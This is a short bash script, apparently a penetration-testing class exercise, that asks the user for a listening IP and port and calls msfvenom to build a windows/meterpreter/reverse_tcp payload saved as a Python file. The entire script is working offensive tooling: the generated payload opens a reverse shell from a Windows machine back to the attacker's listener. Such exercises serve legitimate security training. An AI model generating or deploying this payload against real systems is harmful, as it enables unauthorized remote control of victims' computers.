#!/bin/bash

#Exercise2: 10 minutes until 2:45pm
#- Create a script that gets from the user the Lhost and Lport
#- Automatically generate a windows/meterpreter/reverse_tcp payload

ipi=$(hostname -I)
echo "Your current internal IP address is $ipi"

echo -e "[*] Please set the Lhost listening ip: "
read Lhost
echo -e "[*] Set the Lport listening port: "
read Lport


msfvenom -p windows/meterpreter/reverse_tcp lhost=$Lhost lport=$Lport -f py -o stagedwinrev_tcp$Lport.py

